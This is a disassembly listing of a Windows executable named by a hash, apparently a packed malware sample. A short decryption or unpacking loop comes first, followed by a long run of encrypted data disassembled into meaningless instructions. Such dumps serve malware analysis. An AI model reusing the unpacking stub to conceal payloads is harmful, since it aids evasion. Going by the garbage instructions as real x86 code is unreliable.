
447881d01c614916f129b2f2cf5457e8d11638b992f1d0118272e47434402193.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	cli    
  41107b:	jmp    0xadcbd892
  411080:	call   0x917e:0xe81e1d48
  411087:	bound  ecx,QWORD PTR [ebx-0x549aa307]
  41108d:	mov    esp,0x8f17de6a
  411092:	push   edx
  411093:	push   edx
  411094:	push   eax
  411095:	lds    esp,FWORD PTR [ebx]
  411097:	pop    eax
  411098:	xor    al,0xfc
  41109a:	push   esp
  41109b:	cdq    
  41109c:	dec    ebx
  41109d:	xchg   ebx,eax
  41109e:	fwait
  41109f:	test   BYTE PTR gs:[eax+eax*2],bl
  4110a3:	outs   dx,DWORD PTR ds:[esi]
  4110a4:	shl    dh,cl
  4110a6:	cs loop 0x41103c
  4110a9:	adc    BYTE PTR cs:[eax+eiz*8],0x22
  4110ae:	pop    edi
  4110af:	jbe    0x41106c
  4110b1:	loop   0x41107f
  4110b3:	adc    BYTE PTR [esi],ah
  4110b5:	pop    es
  4110b6:	or     BYTE PTR [edx+0x53b299fe],0x85
  4110bd:	add    eax,edi
  4110bf:	add    BYTE PTR fs:[esi+0x2d6bb9c],ah
  4110c6:	test   al,0xa6
  4110c8:	outs   dx,BYTE PTR ds:[esi]
  4110c9:	sti    
  4110ca:	outs   dx,BYTE PTR ds:[esi]
  4110cb:	push   ebp
  4110cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110cd:	sbb    BYTE PTR [edi-0x497a0371],cl
  4110d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110d4:	lock fisttp QWORD PTR [ebx+eax*2]
  4110d8:	test   al,0x20
  4110da:	dec    ebx
  4110db:	adc    eax,0x70180767
  4110e0:	push   0x6d
  4110e2:	fwait
  4110e3:	xor    al,0xf6
  4110e5:	sub    dl,bl
  4110e7:	shr    eax,cl
  4110e9:	jmp    0xaea28d6d
  4110ee:	jbe    0x411128
  4110f0:	ins    DWORD PTR es:[edi],dx
  4110f1:	inc    ecx
  4110f2:	xchg   ecx,eax
  4110f3:	push   ebx
  4110f4:	(bad)  
  4110f5:	adc    al,0x13
  4110f7:	push   esp
  4110f8:	mov    edx,0x5532a393
  4110fd:	adc    eax,0x51e89d95
  411102:	add    BYTE PTR [ebx-0x2b],ch
  411105:	in     eax,dx
  411106:	cli    
  411107:	xchg   ecx,eax
  411108:	or     DWORD PTR [edi-0x1c],ebp
  41110b:	push   ecx
  41110c:	mov    ecx,0xaf5e4916
  411111:	jne    0x411115
  411113:	ins    BYTE PTR es:[edi],dx
  411114:	dec    esi
  411115:	ds mov cl,0x1c
  411118:	inc    esi
  411119:	sbb    ebx,0xffffffb2
  41111c:	xor    ebp,DWORD PTR [esi]
  41111e:	pop    esi
  41111f:	xchg   esp,eax
  411120:	inc    DWORD PTR [edx]
  411122:	inc    eax
  411123:	enter  0x4926,0xc9
  411127:	sbb    ah,BYTE PTR [edx+ecx*4]
  41112a:	bound  edi,QWORD PTR [esi+0x3b]
  41112d:	call   0x8a6f783d
  411132:	repnz mov DWORD PTR [esp+edi*8],eax
  411136:	push   ebx
  411137:	sbb    eax,0xa8ca9c25
  41113c:	sar    DWORD PTR fs:[eax-0x31],1
  411140:	push   esi
  411141:	mov    edx,0x3d2bc43c
  411146:	sub    eax,0xf399821c
  41114b:	gs into 
  41114d:	pop    ebx
  41114e:	sbb    eax,0x68698b73
  411153:	or     ah,dh
  411155:	(bad)  
  411157:	sahf   
  411158:	popa   
  411159:	mov    cl,BYTE PTR ds:0x1dc1c12b
  41115f:	out    0x64,eax
  411161:	adc    cl,cl
  411163:	push   ebp
  411164:	add    cl,al
  411166:	and    eax,0x49066f29
  41116b:	or     eax,0xb9ad2757
  411170:	dec    ecx
  411171:	pop    ebp
  411172:	je     0x411118
  411174:	mov    esp,0xbd9668fb
  411179:	not    bh
  41117b:	and    al,0x38
  41117d:	adc    ch,0x95
  411180:	and    ecx,DWORD PTR [edx-0x4a9cc870]
  411186:	adc    DWORD PTR [ecx+0x28576062],esp
  41118c:	pop    ecx
  41118d:	adc    al,0x4a
  41118f:	rcr    bh,1
  411191:	mov    ebx,0xb9886422
  411196:	imul   esp,DWORD PTR [esi],0x5a
  411199:	cld    
  41119a:	(bad)  
  41119b:	xor    DWORD PTR [esp+edx*1+0x2b184286],esi
  4111a2:	jo     0x41114d
  4111a4:	adc    ax,WORD PTR ds:[edx]
  4111a8:	mov    ebx,0x27bd4db2
  4111ad:	mov    cl,0xa7
  4111af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b0:	cld    
  4111b1:	adc    al,ch
  4111b3:	jl     0x4111d4
  4111b5:	sbb    esp,DWORD PTR [eax+0x27e8eaf6]
  4111bb:	or     ah,cl
  4111bd:	nop
  4111be:	inc    edi
  4111bf:	sub    DWORD PTR [edi+0x1],0x6b
  4111c3:	and    edi,DWORD PTR [edx]
  4111c5:	ds inc edi
  4111c7:	xor    bl,cl
  4111c9:	int    0x77
  4111cb:	pop    ecx
  4111cc:	das    
  4111cd:	jae    0x41120d
  4111cf:	stos   BYTE PTR es:[edi],al
  4111d0:	xchg   edi,eax
  4111d1:	retf   
  4111d2:	xor    ebp,DWORD PTR [ecx]
  4111d4:	ret    0x429d
  4111d7:	mov    ah,0xcb
  4111d9:	pop    eax
  4111da:	mov    ds:0xd831e87e,al
  4111df:	lahf   
  4111e0:	leave  
  4111e1:	std    
  4111e2:	out    dx,eax
  4111e3:	sbb    DWORD PTR [esi+0x32],esp
  4111e6:	mov    esp,DWORD PTR [ebp+0x37]
  4111e9:	cwde   
  4111ea:	pop    ecx
  4111eb:	mov    ah,0xfd
  4111ed:	or     DWORD PTR [eax],ebx
  4111ef:	mov    ds:0x3669f167,eax
  4111f4:	jmp    FWORD PTR [esi-0xa3cd636]
  4111fa:	out    0x5e,eax
  4111fc:	push   cs
  4111fd:	dec    edi
  4111fe:	leave  
  4111ff:	aas    
  411200:	or     eax,0xa6f16a79
  411205:	nop
  411206:	jmp    0x4111b1
  411208:	xor    eax,ebx
  41120a:	(bad)  
  41120b:	and    DWORD PTR [esi-0x2b],eax
  41120e:	dec    edx
  41120f:	dec    esp
  411210:	add    eax,0xebf5f81
  411215:	pop    eax
  411216:	sbb    eax,0x7313f344
  41121b:	pop    edx
  41121c:	add    al,0xd0
  41121e:	ret    
  41121f:	out    dx,al
  411220:	mov    dh,0xd9
  411222:	int3   
  411223:	jo     0x411252
  411225:	lahf   
  411226:	ins    BYTE PTR es:[edi],dx
  411227:	mov    ah,0x5d
  411229:	arpl   WORD PTR [eax+0x67],di
  41122c:	jmp    0x41128f
  41122e:	in     al,dx
  41122f:	adc    ecx,edi
  411231:	sub    ecx,eax
  411233:	dec    eax
  411234:	loopne 0x41124c
  411236:	mov    esi,0x64b94cfb
  41123b:	das    
  41123c:	mov    cl,0xc5
  41123e:	push   cs
  41123f:	pop    esp
  411240:	pushf  
  411241:	or     eax,0x1c2e3ee5
  411246:	lds    esi,FWORD PTR [edi+eax*8-0xbe8e323]
  41124d:	mov    eax,0x4b84b5a9
  411252:	mov    BYTE PTR [ebp-0x3a],ch
  411255:	ror    DWORD PTR [edx+0x15a8e405],1
  41125b:	call   0x223c:0x5c3fbf57
  411262:	cmp    eax,0x50f8ba0
  411267:	test   BYTE PTR [ebp+0x17e6af07],0x5
  41126e:	loop   0x411235
  411270:	sti    
  411271:	sbb    DWORD PTR [ebx+0x77],ebp
  411274:	mov    esp,0x54fcf868
  411279:	mov    al,0xc4
  41127b:	in     al,dx
  41127c:	mov    al,0xac
  41127e:	and    DWORD PTR [ebp-0x3ada0882],ebx
  411284:	ss ins BYTE PTR es:[edi],dx
  411286:	jmp    0x411248
  411288:	mov    ds:0xae40b140,eax
  41128d:	jne    0x4112ef
  41128f:	call   0xc1c017bf
  411294:	xchg   ecx,eax
  411295:	adc    eax,0xa2f435ad
  41129a:	cmp    esi,edx
  41129c:	dec    edx
  41129d:	or     al,BYTE PTR [esi]
  41129f:	xchg   DWORD PTR [esi+ebp*2-0x63721955],ebp
  4112a6:	add    ebx,DWORD PTR [esi+0x7d]
  4112a9:	inc    esp
  4112aa:	inc    ebx
  4112ab:	jno    0x411293
  4112ad:	and    eax,0x157e7b38
  4112b2:	rol    BYTE PTR [eax+0x71],cl
  4112b5:	stos   DWORD PTR es:[edi],eax
  4112b6:	imul   ebp,DWORD PTR [ebp-0xcf9937b],0x4af03d1b
  4112c0:	dec    esp
  4112c1:	sahf   
  4112c2:	lods   al,BYTE PTR ds:[esi]
  4112c3:	and    edi,DWORD PTR [ebx-0x2bf96752]
  4112c9:	test   BYTE PTR [edx-0x7a43dd90],dl
  4112cf:	and    DWORD PTR [ebx+0x47cd1c9a],edx
  4112d5:	sti    
  4112d6:	jns    0x411296
  4112d8:	stos   BYTE PTR es:[edi],al
  4112d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112da:	fld    DWORD PTR [eax+eiz*2]
  4112dd:	jmp    0xceaf7548
  4112e2:	mov    ?,WORD PTR [ebx]
  4112e4:	js     0x4112c7
  4112e6:	mov    esi,0x318ecc04
  4112eb:	(bad)  
  4112ec:	mov    al,0xd1
  4112ee:	add    bh,BYTE PTR [ecx+0x74aac2bf]
  4112f4:	sub    DWORD PTR [edi],esp
  4112f6:	cs jmp 0x411315
  4112f9:	or     al,0xf6
  4112fb:	sub    esp,DWORD PTR [ebx]
  4112fd:	xchg   DWORD PTR [esi-0x65140ede],ecx
  411303:	int3   
  411304:	xchg   DWORD PTR [ebp+0x59],esi
  411307:	mov    WORD PTR [ecx+0x3f8e0b43],gs
  41130d:	sub    DWORD PTR [edi-0x6],ebx
  411310:	xor    ebp,DWORD PTR ss:[ecx-0x2eaf5e79]
  411317:	push   ds
  411318:	adc    al,0x52
  41131a:	xchg   BYTE PTR [edi-0x302b36f6],ah
  411320:	xchg   dh,cl
  411322:	sbb    al,0xab
  411324:	pop    ebx
  411325:	xchg   DWORD PTR [eax],edx
  411327:	xchg   DWORD PTR [edi+0x30],esp
  41132a:	mov    esp,0x261670b3
  41132f:	out    dx,al
  411330:	imul   BYTE PTR [esp+ebx*2]
  411333:	daa    
  411334:	sub    BYTE PTR [edx],0xa
  411337:	out    0xdf,al
  411339:	ins    BYTE PTR es:[edi],dx
  41133a:	ins    BYTE PTR es:[edi],dx
  41133b:	pop    edi
  41133c:	(bad)  
  41133d:	shl    dl,cl
  41133f:	lea    ecx,[esi+ecx*4]
  411342:	or     BYTE PTR [ebp+0x9c3404a],ch
  411348:	(bad)  
  411349:	xchg   esi,eax
  41134a:	add    DWORD PTR [eax],esp
  41134c:	(bad)  
  41134d:	rcr    DWORD PTR [edx-0x1d],cl
  411350:	adc    esi,ecx
  411352:	cmp    al,0xd3
  411354:	bound  ecx,QWORD PTR [esi+0x5d]
  411357:	push   ss
  411358:	dec    edi
  411359:	add    ah,BYTE PTR [edi]
  41135b:	inc    edx
  41135c:	shr    DWORD PTR [ebx],0x80
  41135f:	in     eax,0xc
  411361:	sbb    BYTE PTR [edx],ah
  411363:	mov    eax,0x315ffe38
  411368:	(bad)  
  411369:	sub    BYTE PTR [ebx+0x79a13efe],bl
  41136f:	popa   
  411370:	jno    0x411314
  411372:	adc    al,0x41
  411374:	inc    esi
  411375:	cmp    al,0x79
  411377:	inc    eax
  411378:	or     ebx,DWORD PTR [esi+ecx*2]
  41137b:	sub    edi,ebp
  41137d:	into   
  41137e:	dec    ecx
  41137f:	add    ecx,ebx
  411381:	xor    eax,0x809699ab
  411386:	fwait
  411387:	xchg   BYTE PTR [eax],ah
  411389:	adc    al,0x9f
  41138b:	xor    edi,ebx
  41138d:	push   eax
  41138e:	pop    ds
  41138f:	mov    eax,ds:0x59d79
  411394:	sar    dl,0x9b
  411397:	addr16 repnz out 0x90,al
  41139b:	addr16 add al,0xfd
  41139e:	or     al,0xfa
  4113a0:	fbstp  TBYTE PTR [ecx-0x5a9cc72d]
  4113a6:	adc    DWORD PTR [edi-0x12b8be8],0x98ec2ba0
  4113b0:	ja     0x411413
  4113b2:	push   ebx
  4113b3:	pop    eax
  4113b4:	and    eax,0x60e295b9
  4113b9:	and    eax,0x4fc92c23
  4113be:	nop
  4113bf:	mov    ah,0xc7
  4113c1:	daa    
  4113c2:	out    0x97,eax
  4113c4:	hlt    
  4113c5:	(bad)  
  4113c6:	fbstp  TBYTE PTR [edi+0x6ea99a44]
  4113cc:	mov    edx,0x58ad9756
  4113d1:	js     0x411433
  4113d3:	or     DWORD PTR [eax],eax
  4113d5:	test   BYTE PTR [ecx-0xc],al
  4113d8:	and    esp,ecx
  4113da:	dec    edi
  4113db:	xchg   edi,esp
  4113dd:	jp     0x4113dd
  4113df:	ficomp WORD PTR [edi-0x74]
  4113e2:	sbb    DWORD PTR [ecx-0x5d],esi
  4113e5:	lods   al,BYTE PTR ds:[esi]
  4113e6:	lea    esi,ds:0x7f7fffd0
  4113ec:	arpl   WORD PTR [esi+esi*4],si
  4113ef:	and    ecx,DWORD PTR [ecx+eax*1-0x3337e512]
  4113f6:	pop    ebx
  4113f7:	mov    ?,WORD PTR [ebp-0x176c8079]
  4113fd:	popf   
  4113fe:	inc    eax
  4113ff:	popa   
  411400:	shl    ebp,1
  411402:	test   al,0x7f
  411404:	pop    ebx
  411405:	sub    BYTE PTR [ebp+0x39b947b0],dh
  41140b:	mov    edx,0xc0eb4172
  411410:	and    eax,0x1859883d
  411415:	in     al,0x80
  411417:	aas    
  411418:	pop    esi
  411419:	dec    eax
  41141a:	adc    edx,0x83baff56
  411420:	(bad)  
  411421:	loope  0x4113ac
  411423:	outs   dx,DWORD PTR ds:[esi]
  411424:	add    BYTE PTR ds:0x7eb6a412,0x10
  41142b:	dec    ebx
  41142c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41142d:	xlat   BYTE PTR ds:[ebx]
  41142e:	outs   dx,DWORD PTR ds:[esi]
  41142f:	cmp    cl,BYTE PTR [ebx+0x38b283d3]
  411435:	lea    ecx,[ecx-0x1c72f825]
  41143b:	add    BYTE PTR [edi+0x7],0x11
  41143f:	outs   dx,BYTE PTR ds:[esi]
  411440:	cmp    DWORD PTR [ebp-0x58499e20],ebx
  411446:	sbb    al,0x52
  411448:	push   ebx
  411449:	ins    DWORD PTR es:[edi],dx
  41144a:	cmp    ecx,edi
  41144c:	and    dh,ch
  41144e:	neg    BYTE PTR [esi-0x5d]
  411451:	inc    ebp
  411452:	mov    ebp,0xd11a05ae
  411457:	retf   0xfe9
  41145a:	mov    DWORD PTR [eax],ecx
  41145c:	inc    esi
  41145d:	jnp    0x4114c6
  41145f:	aam    0x57
  411461:	out    0x3a,al
  411463:	fisttp WORD PTR [ebp+0x74]
  411466:	ins    DWORD PTR es:[edi],dx
  411467:	push   edi
  411468:	inc    BYTE PTR [ebp-0x7fb994bc]
  41146e:	repnz adc eax,esi
  411471:	xchg   edi,eax
  411472:	or     DWORD PTR [edi],ecx
  411474:	mov    esi,0xe3575be6
  411479:	sbb    eax,0x30fd8e59
  41147e:	mul    BYTE PTR [edi-0x5edb99b7]
  411484:	int3   
  411485:	push   eax
  411486:	gs lock inc esi
  411489:	sbb    BYTE PTR [eax-0x4ecd2806],bh
  41148f:	jp     0x41150a
  411491:	fwait
  411492:	outs   dx,BYTE PTR ds:[esi]
  411493:	jno    0x4114b4
  411495:	pop    es
  411496:	adc    BYTE PTR [edx+ecx*1-0x3a],bh
  41149a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41149b:	mov    ebx,DWORD PTR [eax+0x15]
  41149e:	(bad)  
  4114a0:	mov    WORD PTR [ecx],ds
  4114a2:	mov    al,ds:0x2eeafb66
  4114a8:	sahf   
  4114a9:	les    ebp,FWORD PTR [esi+0x24]
  4114ac:	adc    al,0xd3
  4114ae:	inc    esp
  4114af:	add    DWORD PTR [esi-0xc],ebx
  4114b2:	push   ebp
  4114b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b4:	dec    esp
  4114b5:	(bad)  
  4114b7:	(bad)  
  4114b8:	push   edx
  4114b9:	jmp    0x41152c
  4114bb:	sub    BYTE PTR [ebx],ah
  4114bd:	mov    al,BYTE PTR [edx+0x4db26ca9]
  4114c3:	mov    ds:0x990bf6af,eax
  4114c8:	hlt    
  4114c9:	mov    al,ds:0x4b3b8c23
  4114ce:	pop    ds
  4114cf:	dec    esp
  4114d0:	sub    al,0x88
  4114d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114d3:	popa   
  4114d4:	inc    edx
  4114d5:	call   0x525d:0xc58100af
  4114dc:	adc    ebp,DWORD PTR [eax]
  4114de:	pop    es
  4114df:	pop    es
  4114e0:	cmp    al,0x50
  4114e2:	fwait
  4114e3:	sub    eax,DWORD PTR [ebp+0x60d7cc3b]
  4114e9:	dec    eax
  4114ea:	push   esi
  4114eb:	jns    0x4114d8
  4114ed:	pop    ebx
  4114ee:	js     0x411563
  4114f0:	sahf   
  4114f1:	(bad)  
  4114f2:	outs   dx,DWORD PTR ds:[esi]
  4114f3:	mov    bh,al
  4114f5:	ins    DWORD PTR es:[edi],dx
  4114f6:	cmp    esi,esi
  4114f8:	lea    esp,[eax-0x6fa151fc]
  4114fe:	adc    ecx,DWORD PTR [edx+eax*4]
  411501:	push   ecx
  411502:	fwait
  411503:	xchg   edx,eax
  411504:	imul   ecx,DWORD PTR [eax+edi*8+0x69],0xfe6b63e7
  41150c:	inc    edi
  41150d:	in     al,0x67
  41150f:	test   BYTE PTR [edx],0xfa
  411512:	out    0xcd,eax
  411514:	sbb    bl,cl
  411516:	inc    edi
  411517:	push   cs
  411518:	cli    
  411519:	pop    edi
  41151a:	mov    ah,0x5
  41151c:	retf   0x10ab
  41151f:	and    eax,0xfaf575d7
  411524:	xor    ebp,DWORD PTR [ebx]
  411526:	rcr    BYTE PTR [edi+0x5da87040],cl
  41152c:	cmp    al,BYTE PTR [edx]
  41152e:	std    
  41152f:	pop    ecx
  411530:	mov    eax,ds:0x35b4e27e
  411535:	inc    DWORD PTR [ebx+0x68]
  411538:	jbe    0x4114dc
  41153a:	shr    BYTE PTR [eax],cl
  41153c:	cmp    ch,bl
  41153e:	cmp    DWORD PTR [ebx-0x6996cc2f],esi
  411544:	rcr    DWORD PTR [eax],cl
  411546:	cmp    BYTE PTR [edi],0x8
  411549:	or     eax,0xcf54b3ad
  41154e:	xlat   BYTE PTR ds:[ebx]
  41154f:	xor    bh,ah
  411551:	sub    al,0xef
  411553:	sbb    DWORD PTR [eax],ebp
  411555:	(bad)  
  411556:	mov    al,ds:0x89e4d78e
  41155b:	add    al,0xc
  41155d:	pop    ss
  41155e:	cwde   
  41155f:	sbb    al,0x1a
  411561:	shl    DWORD PTR [ecx-0x7d9233d7],0xd
  411568:	clc    
  411569:	repz leave 
  41156b:	aas    
  41156c:	add    al,0x20
  41156e:	imul   ecx,DWORD PTR [esi],0xd32047aa
  411574:	enter  0xe6ed,0x3d
  411578:	xor    ah,BYTE PTR [eax]
  41157a:	mov    esi,0x3d7e8682
  41157f:	xchg   ebx,eax
  411580:	cdq    
  411581:	xchg   ecx,eax
  411582:	pop    edi
  411583:	imul   edi,DWORD PTR [ebp+0x359d4d3b],0x7ecdb5ef
  41158d:	arpl   WORD PTR [ebx+0x3dc0aa93],sp
  411593:	push   ds
  411594:	add    bh,BYTE PTR [edx-0x10]
  411597:	(bad)  
  411598:	and    edi,DWORD PTR ds:0xef308c20
  41159e:	(bad)  
  41159f:	ins    DWORD PTR es:[edi],dx
  4115a0:	mov    eax,0x30c0bee1
  4115a5:	repz jle 0x411570
  4115a8:	adc    al,0x96
  4115aa:	mov    dl,0x4a
  4115ac:	mov    DWORD PTR [ebp+ecx*4+0x75f98b7],ebx
  4115b3:	mov    ch,0x5
  4115b5:	inc    edx
  4115b6:	idiv   dl
  4115b8:	inc    ebx
  4115b9:	sub    ch,BYTE PTR [esi]
  4115bb:	sub    cl,BYTE PTR [ebx]
  4115bd:	cmc    
  4115be:	repnz hlt 
  4115c0:	sbb    eax,0xdb79933
  4115c5:	mov    esp,ecx
  4115c7:	fiadd  WORD PTR [ebp-0x1eed5262]
  4115cd:	xchg   esi,eax
  4115ce:	dec    ebp
  4115cf:	outs   dx,BYTE PTR ds:[esi]
  4115d0:	std    
  4115d1:	into   
  4115d2:	stc    
  4115d3:	pushf  
  4115d4:	cmp    al,dh
  4115d6:	pop    ebx
  4115d7:	nop
  4115d8:	add    al,BYTE PTR [edi+0x3f]
  4115db:	dec    ebp
  4115dc:	scas   eax,DWORD PTR es:[edi]
  4115dd:	mov    ?,WORD PTR [esi+0x2d]
  4115e0:	stc    
  4115e1:	out    0x1,eax
  4115e3:	cmp    bl,BYTE PTR [esp+ebp*4-0x35]
  4115e7:	sbb    edx,DWORD PTR [eax-0x54b6758]
  4115ed:	and    eax,0x6d37ccc2
  4115f2:	mov    dh,0x39
  4115f4:	or     ebx,edi
  4115f6:	adc    edx,DWORD PTR [edi]
  4115f8:	dec    cx
  4115fa:	mov    edi,0xf45d89f
  4115ff:	adc    ebx,DWORD PTR [edx]
  411601:	aas    
  411602:	(bad)  
  411603:	ja     0x411633
  411605:	jno    0x41163d
  411607:	dec    edi
  411608:	adc    BYTE PTR [ebp-0x4a],bh
  41160b:	in     eax,dx
  41160c:	push   eax
  41160d:	or     esp,DWORD PTR [edx-0x58cfb7f2]
  411613:	and    edx,DWORD PTR [edi-0x70741062]
  411619:	adc    dh,BYTE PTR [eax-0x42878698]
  41161f:	outs   dx,DWORD PTR ds:[esi]
  411620:	cmp    eax,0x7434a936
  411625:	xor    al,0x97
  411627:	repz mov bl,0x2f
  41162a:	fwait
  41162b:	mov    ch,0x3
  41162d:	sbb    DWORD PTR [esp+eax*2+0xd],0x930a1f4d
  411635:	sbb    BYTE PTR [edx],al
  411637:	xor    eax,0xcd9ece0c
  41163c:	clc    
  41163d:	mov    bh,0x90
  41163f:	lahf   
  411640:	dec    ecx
  411641:	pop    es
  411642:	in     al,dx
  411643:	leave  
  411644:	mov    DWORD PTR [eax-0x2f],ecx
  411647:	mov    ebp,0xd02d8709
  41164c:	sub    BYTE PTR [eax-0x77f480b],cl
  411652:	loop   0x4116a3
  411654:	hlt    
  411655:	into   
  411656:	call   FWORD PTR ds:0xda2b319b
  41165c:	jne    0x411625
  41165e:	fnsave [edx]
  411660:	mov    DWORD PTR [edi],esp
  411662:	push   eax
  411663:	fwait
  411664:	loopne 0x41162f
  411666:	xor    dl,ah
  411668:	mov    al,0x97
  41166a:	hlt    
  41166b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166c:	sub    DWORD PTR [ebx+0x256fe6e4],esp
  411672:	(bad)  
  411673:	stos   DWORD PTR es:[edi],eax
  411674:	sub    al,0xfd
  411676:	pop    ecx
  411677:	scas   eax,DWORD PTR es:[edi]
  411678:	push   edx
  411679:	pop    edx
  41167a:	(bad)  
  41167b:	dec    edx
  41167c:	mov    ebp,DWORD PTR [esi+0x57]
  41167f:	mov    ds:0x36fb312b,eax
  411684:	mov    esp,0x38e30e8
  411689:	xchg   esi,esi
  41168b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41168c:	mov    esi,DWORD PTR [esi+0xdafcae]
  411692:	or     al,0x10
  411694:	pusha  
  411695:	test   al,0xa2
  411697:	cli    
  411698:	or     ebx,DWORD PTR [eax-0x40]
  41169b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41169c:	xchg   ebp,eax
  41169d:	ins    BYTE PTR es:[edi],dx
  41169e:	xor    eax,0xf4bcf02c
  4116a3:	out    0xb3,al
  4116a5:	mov    edx,0x16619db9
  4116aa:	scas   eax,DWORD PTR es:[edi]
  4116ab:	jp     0x4116fb
  4116ad:	nop
  4116ae:	(bad)  
  4116b0:	push   esi
  4116b1:	xchg   cl,al
  4116b3:	ror    DWORD PTR [edi+0x13],cl
  4116b6:	xchg   DWORD PTR [edx+0x6c],edi
  4116b9:	into   
  4116ba:	mov    ah,0x98
  4116bc:	add    ecx,DWORD PTR [eax+0x3c28789f]
  4116c2:	push   esp
  4116c3:	loopne 0x41164d
  4116c5:	ret    
  4116c6:	push   ss
  4116c7:	mov    ds:0x40d6c13f,al
  4116cc:	aas    
  4116cd:	sar    DWORD PTR [ebx],1
  4116cf:	mov    ebp,ebx
  4116d1:	je     0x41168f
  4116d3:	add    ch,cl
  4116d5:	retf   0x2512
  4116d8:	sbb    BYTE PTR [edi+0x48fa8ee3],al
  4116de:	outs   dx,BYTE PTR ds:[esi]
  4116df:	xlat   BYTE PTR ds:[ebx]
  4116e0:	cmp    al,0x96
  4116e2:	mov    ch,0xc
  4116e4:	sub    DWORD PTR [eax],edi
  4116e6:	call   0x2a49cad9
  4116eb:	or     BYTE PTR [ecx],0x55
  4116ee:	int3   
  4116ef:	jle    0x411704
  4116f1:	in     al,0xcf
  4116f3:	or     bh,BYTE PTR [ecx-0x1404a4ac]
  4116f9:	mov    dl,0x56
  4116fb:	xchg   ebp,eax
  4116fc:	imul   eax,eax,0x7a91bb12
  411702:	add    DWORD PTR [ebx+0x40],esi
  411705:	aaa    
  411706:	ja     0x41174c
  411708:	push   esp
  411709:	mov    esi,0x43a8747d
  41170e:	hlt    
  41170f:	inc    esp
  411710:	div    DWORD PTR [ebx-0x2a]
  411713:	pop    ebp
  411714:	pusha  
  411715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411716:	mov    al,0x86
  411718:	mov    esi,0x9d964c46
  41171d:	or     ch,dh
  41171f:	out    dx,al
  411720:	loope  0x4116cc
  411722:	dec    ebx
  411723:	and    al,0xd4
  411725:	int3   
  411726:	scas   eax,DWORD PTR es:[edi]
  411727:	jbe    0x41171f
  411729:	xchg   edi,eax
  41172a:	imul   edi,DWORD PTR [eax-0x701c2531],0x5
  411731:	data16 add al,0x31
  411734:	retf   0x60c3
  411737:	adc    al,0x28
  411739:	mov    al,ds:0xd2f16c74
  41173e:	stc    
  41173f:	dec    BYTE PTR [esi]
  411741:	repz add DWORD PTR [ebp-0x18],edx
  411745:	cmp    DWORD PTR [edx-0x61b681a8],edx
  41174b:	adc    DWORD PTR [edi-0x394c7099],edx
  411751:	jl     0x4116ff
  411753:	pop    edi
  411754:	mov    al,0x18
  411756:	ins    DWORD PTR es:[edi],dx
  411757:	repz loopne 0x4117cc
  41175a:	into   
  41175b:	jo     0x4117a7
  41175d:	test   eax,0xede6439b
  411762:	sub    al,0x3f
  411764:	mov    edx,edi
  411766:	jne    0x411724
  411768:	sbb    edi,DWORD PTR [esi-0x3a]
  41176b:	test   DWORD PTR [esi],eax
  41176d:	(bad)
  411773:	xchg   DWORD PTR [edi],edx
  411775:	loop   0x41179f
  411777:	repnz dec DWORD PTR [ecx+0x20]
  41177b:	std    
  41177c:	inc    esp
  41177d:	jmp    0xe10d191b
  411782:	jge    0x4117bb
  411784:	push   esi
  411785:	sti    
  411786:	cdq    
  411787:	and    al,0x58
  411789:	xchg   ecx,eax
  41178a:	xlat   BYTE PTR ds:[ebx]
  41178b:	fs sub al,0x87
  41178e:	cld    
  41178f:	(bad)  
  411790:	sub    eax,0x13f12d1f
  411795:	cwde   
  411796:	push   cs
  411797:	xchg   esp,eax
  411798:	(bad)  
  411799:	retf   
  41179a:	mov    ebp,0x8015a846
  41179f:	(bad)  
  4117a0:	sti    
  4117a1:	pusha  
  4117a2:	and    ebx,DWORD PTR [ebx]
  4117a4:	sar    DWORD PTR [eax],0x51
  4117a7:	mov    esp,0xad549250
  4117ac:	(bad)  [ebx+edx*4+0x68]
  4117b0:	or     al,0xaf
  4117b2:	les    esi,FWORD PTR [ebx]
  4117b4:	push   es
  4117b5:	dec    ebx
  4117b6:	mov    edi,0x2b9b5b66
  4117bb:	dec    edi
  4117bc:	or     edi,DWORD PTR [edx-0x3d]
  4117bf:	or     al,0x31
  4117c1:	scas   al,BYTE PTR es:[edi]
  4117c2:	lock pop eax
  4117c4:	test   al,0xef
  4117c6:	icebp  
